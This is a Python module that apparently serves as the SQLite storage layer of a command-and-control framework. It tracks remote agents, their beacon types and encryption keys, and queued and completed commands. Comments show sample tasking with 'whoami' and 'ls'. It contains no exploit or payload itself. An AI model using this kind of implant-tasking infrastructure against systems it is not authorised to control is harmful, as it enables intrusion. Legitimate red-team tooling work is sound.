from os import path
from core.logger import *
from datetime import datetime
from sqlite3 import Error, connect

class Stash :

    def __init__(self, db_name):
        self.db_file = db_name

    def create_connection(self):
        conn = None
        try:
            conn = connect(self.db_file)
            # conn.row_factory = lambda cursor, row: row[0]
            return conn
        except Error as e:
            error(e)

        return conn

    def sql_stash(self, sql_query , sql_values=None):
        conn = self.create_connection()

        try:
            c = conn.cursor()
            if sql_values != None:
            	c.execute(sql_query , sql_values)
            else:
            	c.execute(sql_query)
        except Error as e:
            error(e)

        conn.commit()
        conn.close()

    def db_init(self):
        self.sql_stash( """ PRAGMA foreign_keys = ON; """ )

        ## AGENTS
        self.sql_stash(""" CREATE TABLE IF NOT EXISTS agents (
            agent_name TEXT PRIMARY KEY, \
            listener_name TEXT, \
            remote_ip TEXT, \
            hostname TEXT, \
            beacon_type TEXT, \
            enc_key TEXT); """)

        self.sql_stash(""" CREATE TABLE IF NOT EXISTS commands (
            command_code TEXT PRIMARY KEY, \
            agent_name TEXT, \
            command TEXT, \
            time_stamp DATETIME NOT NULL DEFAULT (strftime('%Y-%m-%d %H:%M:%f', 'now', 'localtime')) ); """)

        self.sql_stash(""" CREATE TABLE IF NOT EXISTS commands_history (
            agent_name TEXT, \
            command_code TEXT PRIMARY KEY, \
            command TEXT, \
            output TEXT, \
            time_stamp DATETIME NOT NULL DEFAULT (strftime('%Y-%m-%d %H:%M:%f', 'now', 'localtime')) ); """)

        self.sql_stash(""" CREATE TABLE IF NOT EXISTS key_store (
            enc_key TEXT, \
            list_name TEXT PRIMARY KEY ); """)

    def get_task(self, agent):
        conn = self.create_connection()
        try:
            c = conn.cursor()
            c.execute( 'SELECT command_code,command FROM commands WHERE agent_name = ? ORDER BY time_stamp ASC LIMIT 1' , ( agent, ) )
            result = c.fetchall()
        except Error as e:
            error(e)
            result = []

        conn.close()
        return result

    def check_code(self, com_code):
        conn = self.create_connection()
        result = []
        try:
            c = conn.cursor()
            c.execute( 'SELECT EXISTS(SELECT 1 FROM commands WHERE command_code = ?)' , ( com_code, ) )
            result.append( c.fetchall()[0][0] )
            c.execute( 'SELECT EXISTS(SELECT 1 FROM commands_history WHERE command_code = ?)' , ( com_code, ) )
            result.append( c.fetchall()[0][0] )
        except Error as e:
            error(e)

        conn.close()
        return sum(result)

    def get_key(self, listener):
        conn = self.create_connection()
        result = ''
        try:
            c = conn.cursor()
            c.execute( 'SELECT enc_key FROM key_store WHERE list_name = ?' , ( listener, ) )
            result = c.fetchall()
        except Error as e:
            error(e)

        conn.close()
        return result


    # def store_key(self, com_code, key):
    #     conn = self.create_connection()

    def del_commands(self, code):
        conn = self.create_connection()
        try:
            c = conn.cursor()
            c.execute( 'DELETE FROM commands WHERE command_code = ?' , ( code, ) )
            conn.commit()
        except Error as e:
            error(e)

        conn.close()



## command history
## insert into commands_history(command_code,agent_name,command,output) VALUES("oooogy78","adadasddsa","command one yeah lol","");
## commands
## insert into commands(command_code,agent_name,command) VALUES("wwwwgy78","adadasddsa","ls");


###

#insert into commands(command_code,agent_name,command) VALUES("dfvsvdfsdfv","cKrOXnHoyE","EQ240FLMi3z5l2R4GNUJeKPVXGrKz3qwm7++2jAAZMM=");
#insert into commands_history(command_code,agent_name,command,output) VALUES("dfvsvdfsdfv","cKrOXnHoyE","whoami","");